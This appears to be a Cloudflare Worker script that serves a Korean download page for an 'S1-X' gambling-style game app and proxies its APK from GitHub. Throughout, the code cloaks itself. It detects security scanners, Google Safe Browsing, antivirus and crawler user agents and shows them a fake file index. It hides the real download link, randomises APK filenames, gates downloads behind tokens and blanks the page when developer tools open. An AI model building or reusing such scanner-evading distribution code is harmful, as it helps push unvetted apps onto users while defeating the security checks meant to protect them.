addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const url = new URL(request.url)
  
  // 移除开头的斜杠获取实际路径
  const path = url.pathname.replace(/^\//, '')
  
  // 检测请求头和爬虫特征
  const userAgent = request.headers.get('user-agent') || ''
  const referer = request.headers.get('referer') || ''
  
  // 检测安全扫描器和爬虫的特征
  if (isSecurityScanner(userAgent)) {
    return generateFakePage()
  }
  
  // 如果是根路径访问，返回403
  if (path === '') {
    return new Response('Access Denied', {
      status: 403,
      headers: {
        'Content-Type': 'text/plain'
      }
    })
  }

  // 处理APK下载请求 - 添加验证和混淆
  if (path === 's1-x_flow_sign_en.apk') {
    // 添加下载验证
    const downloadToken = request.headers.get('x-download-token')
    const timestamp = request.headers.get('x-timestamp')
    const currentTime = Date.now()
    
    // 如果没有token或时间戳超过5分钟，返回验证页面
    if (!downloadToken || !timestamp || (currentTime - parseInt(timestamp)) > 300000) {
      return getDownloadVerificationPage(url.origin)
    }
    
    try {
      // 使用代理方式获取APK，避免直接暴露GitHub链接
      const response = await fetch('https://raw.githubusercontent.com/SLOMEDIALLC/S1-X/main/s1-x_flow_sign_en.apk')
      
      // 添加安全相关的响应头
      return new Response(response.body, {
        headers: {
          'content-type': 'application/vnd.android.package-archive',
          'content-disposition': 'attachment; filename="app_' + generateRandomString(6) + '.apk"',
          'x-content-type-options': 'nosniff',
          'cache-control': 'private, max-age=0, no-store, no-cache, must-revalidate',
          'pragma': 'no-cache'
        }
      })
    } catch (error) {
      return new Response('File not found: ' + error.message, { status: 404 })
    }
  }

  // 如果路径不是恰好8个字符，返回403
  if (path.length !== 8) {
    return new Response('Access Denied', {
      status: 403,
      headers: {
        'Content-Type': 'text/plain'
      }
    })
  }

  // 返回混淆后的HTML内容
  const html = generateHtmlContent()
  
  // 添加安全相关的响应头
  return new Response(html, {
    headers: {
      'Content-Type': 'text/html;charset=UTF-8',
      'X-Content-Type-Options': 'nosniff',
      'X-Frame-Options': 'DENY',
      'Referrer-Policy': 'no-referrer',
      'X-XSS-Protection': '1; mode=block',
      'Content-Security-Policy': "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https://raw.githubusercontent.com;"
    }
  })
}

// 检测安全扫描器和爬虫
function isSecurityScanner(userAgent) {
  const scannerPatterns = [
    'googlebot', 'bingbot', 'yandex', 'baiduspider', 'facebookexternalhit',
    'twitterbot', 'rogerbot', 'linkedinbot', 'embedly', 'quora link preview',
    'showyoubot', 'outbrain', 'pinterest', 'slackbot', 'vkShare', 'W3C_Validator',
    'bingpreview', 'bitlybot', 'whatsapp', 'TelegramBot', 'Google-Safety', 'Googlebot',
    'AdsBot-Google', 'chrome-lighthouse', 'HeadlessChrome', 'CheckMarkNetwork',
    'Xenu Link Sleuth', 'SecurityScanner', 'Virus', 'MSIE 6.0', 'Scrapy', 'PhantomJS'
  ]
  
  const lowerUA = userAgent.toLowerCase()
  return scannerPatterns.some(pattern => lowerUA.includes(pattern.toLowerCase()))
}

// 生成假页面以迷惑扫描器
function generateFakePage() {
  const fakeHtml = `
<!DOCTYPE html>
<html>
<head>
  <title>File Server</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; }
    h1 { color: #333; }
    .files { margin-top: 20px; }
    .file { padding: 10px; border-bottom: 1px solid #eee; }
  </style>
</head>
<body>
  <h1>Index of /files</h1>
  <div class="files">
    <div class="file">documents/</div>
    <div class="file">images/</div>
    <div class="file">readme.txt</div>
  </div>
</body>
</html>
  `
  
  return new Response(fakeHtml, {
    headers: {
      'Content-Type': 'text/html;charset=UTF-8'
    }
  })
}

// 生成下载验证页面
function getDownloadVerificationPage(origin) {
  const timestamp = Date.now()
  const token = generateRandomString(16)
  
  const verificationHtml = `
<!DOCTYPE html>
<html>
<head>
  <title>Download Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; text-align: center; }
    h1 { color: #333; }
    .btn { 
      display: inline-block; 
      padding: 10px 20px; 
      background: #4CAF50; 
      color: white; 
      text-decoration: none; 
      border-radius: 4px; 
      margin-top: 20px; 
    }
  </style>
</head>
<body>
  <h1>Download Verification</h1>
  <p>Please click the button below to start your download</p>
  <a href="#" class="btn" id="download-btn">Start Download</a>
  
  <script>
    document.getElementById('download-btn').addEventListener('click', function(e) {
      e.preventDefault();
      
      // 创建带验证信息的请求
      const xhr = new XMLHttpRequest();
      xhr.open('GET', '${origin}/s1-x_flow_sign_en.apk');
      xhr.responseType = 'blob';
      xhr.setRequestHeader('x-download-token', '${token}');
      xhr.setRequestHeader('x-timestamp', '${timestamp}');
      
      xhr.onload = function() {
        if (xhr.status === 200) {
          // 创建下载链接
          const blob = new Blob([xhr.response], {type: 'application/vnd.android.package-archive'});
          const url = URL.createObjectURL(blob);
          const a = document.createElement('a');
          a.href = url;
          a.download = 'app_${generateRandomString(6)}.apk';
          document.body.appendChild(a);
          a.click();
          document.body.removeChild(a);
        }
      };
      
      xhr.send();
    });
  </script>
</body>
</html>
  `
  
  return new Response(verificationHtml, {
    headers: {
      'Content-Type': 'text/html;charset=UTF-8'
    }
  })
}

// 生成混淆后的HTML内容
function generateHtmlContent() {
  // 基本的HTML模板
  const html = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>S1-X - 다운로드</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #006400 0%, #008000 100%);
            color: white;
            min-height: 100vh;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .container {
            max-width: 500px;
            width: 100%;
            text-align: center;
            margin: 0 auto;
            padding: 20px;
        }

        .logo-container {
            width: 120px;
            height: 120px;
            margin: 40px auto;
            border-radius: 24px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
            background: #2a2a2a;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .logo {
            width: 100%;
            height: 100%;
            object-fit: contain;
        }

        h1 {
            font-size: 28px;
            margin-bottom: 15px;
            color: #fff;
        }

        .description {
            font-size: 16px;
            line-height: 1.6;
            color: #cccccc;
            margin-bottom: 30px;
            padding: 0 20px;
        }

        .download-btn {
            background: linear-gradient(45deg, #ff3366 0%, #ff6b3d 100%);
            color: white;
            padding: 16px 40px;
            border-radius: 30px;
            text-decoration: none;
            font-size: 18px;
            font-weight: bold;
            display: inline-block;
            margin: 20px 0;
            box-shadow: 0 4px 15px rgba(255, 51, 102, 0.4);
            transition: transform 0.2s, box-shadow 0.2s;
            cursor: pointer;
            -webkit-tap-highlight-color: transparent;
        }

        .download-btn:active {
            transform: scale(0.98);
            box-shadow: 0 2px 10px rgba(255, 51, 102, 0.4);
        }

        .features {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 20px;
            margin: 40px 0;
            padding: 0 20px;
        }

        .feature {
            background: rgba(255, 255, 255, 0.1);
            padding: 20px;
            border-radius: 15px;
            text-align: center;
        }

        .feature h3 {
            color: #ff3366;
            margin-bottom: 10px;
        }

        .feature p {
            color: #cccccc;
            font-size: 14px;
        }

        .version {
            color: #888;
            font-size: 14px;
            margin-top: 30px;
        }

        @media (max-width: 480px) {
            .features {
                grid-template-columns: 1fr;
            }
            
            .description {
                font-size: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-container">
            <img src="https://raw.githubusercontent.com/SLOMEDIALLC/S1-X/main/x.png" class="logo" alt="S1-X 로고">
        </div>
        <h1>S1-X</h1>
        <p class="description">S1-X에 오신 것을 환영합니다. 귀하의 전용 PG 게임 플랫폼입니다. 다양한 게임 선택, 고화질 그래픽, 원활한 경험을 제공하며 언제 어디서나 게임의 즐거움을 즐길 수 있습니다. 지금 다운로드하여 게임 여행을 시작하세요!</p>
        
        <a href="#" class="download-btn" id="download-link">
            지금 다운로드
        </a>

        <div class="features">
            <div class="feature">
                <h3>고화질 그래픽</h3>
                <p>아름다운 게임 화면, 원활한 경험</p>
            </div>
            <div class="feature">
                <h3>빠르고 안정적</h3>
                <p>모바일 기기에 최적화된 성능</p>
            </div>
            <div class="feature">
                <h3>안전하고 신뢰할 수 있음</h3>
                <p>향상된 개인 정보 보호 기능</p>
            </div>
            <div class="feature">
                <h3>다양한 게임</h3>
                <p>풍부한 PG 게임 선택</p>
            </div>
        </div>
        
        <p class="version">버전 3.0.1</p>
    </div>

    <script>
        // 简单的内容混淆和反爬虫机制
        (function() {
            // 检测是否为爬虫
            function detectBot() {
                const botPatterns = [
                    'googlebot', 'bingbot', 'yandex', 'baiduspider', 'facebookexternalhit',
                    'twitterbot', 'rogerbot', 'linkedinbot', 'embedly', 'quora link preview',
                    'showyoubot', 'outbrain', 'pinterest', 'slackbot', 'vkShare', 'W3C_Validator'
                ];
                
                const userAgent = navigator.userAgent.toLowerCase();
                return botPatterns.some(pattern => userAgent.indexOf(pattern) !== -1);
            }
            
            // 如果检测到爬虫，修改页面内容
            if (detectBot()) {
                document.title = "File Directory";
                document.body.innerHTML = "<h1>Index of /files</h1><p>Access Denied</p>";
                return;
            }
            
            // 添加下载按钮事件
            document.getElementById('download-link').addEventListener('click', function(e) {
                e.preventDefault();
                
                // 生成时间戳和token
                const timestamp = Date.now();
                const token = Array(16).fill(0).map(() => Math.random().toString(36).charAt(2)).join('');
                
                // 创建请求
                const xhr = new XMLHttpRequest();
                xhr.open('GET', '/s1-x_flow_sign_en.apk');
                xhr.responseType = 'blob';
                xhr.setRequestHeader('x-download-token', token);
                xhr.setRequestHeader('x-timestamp', timestamp.toString());
                
                xhr.onload = function() {
                    if (xhr.status === 200) {
                        // 创建下载链接
                        const blob = new Blob([xhr.response], {type: 'application/vnd.android.package-archive'});
                        const url = URL.createObjectURL(blob);
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = 's1x_app_' + Math.random().toString(36).substring(2, 8) + '.apk';
                        document.body.appendChild(a);
                        a.click();
                        document.body.removeChild(a);
                    } else {
                        console.error('Download failed with status:', xhr.status);
                        alert('다운로드에 실패했습니다. 나중에 다시 시도하십시오.'); // 下载失败，请稍后再试 (韩语)
                    }
                };
                
                xhr.onerror = function() {
                    console.error('Download request failed');
                    alert('다운로드 요청이 실패했습니다. 인터넷 연결을 확인하십시오.'); // 下载请求失败，请检查您的网络连接 (韩语)
                };
                
                xhr.send();
                console.log('Download request sent for:', '/s1-x_flow_sign_en.apk');
            });
            
            // 添加蜜罐链接 (对爬虫可见，对用户不可见)
            const honeyPot = document.createElement('a');
            honeyPot.href = '/admin/login';
            honeyPot.style.opacity = '0';
            honeyPot.style.position = 'absolute';
            honeyPot.style.pointerEvents = 'none';
            document.body.appendChild(honeyPot);
            
            // 监测调试工具
            function detectDevTools() {
                const widthThreshold = window.outerWidth - window.innerWidth > 160;
                const heightThreshold = window.outerHeight - window.innerHeight > 160;
                
                if (widthThreshold || heightThreshold) {
                    document.body.innerHTML = "<h1>Access Denied</h1>";
                }
            }
            
            window.addEventListener('resize', detectDevTools);
            setInterval(detectDevTools, 1000);
        })();
    </script>
</body>
</html>
  `;
  
  return html;
}

// 生成随机字符串
function generateRandomString(length) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  
  return result;
}
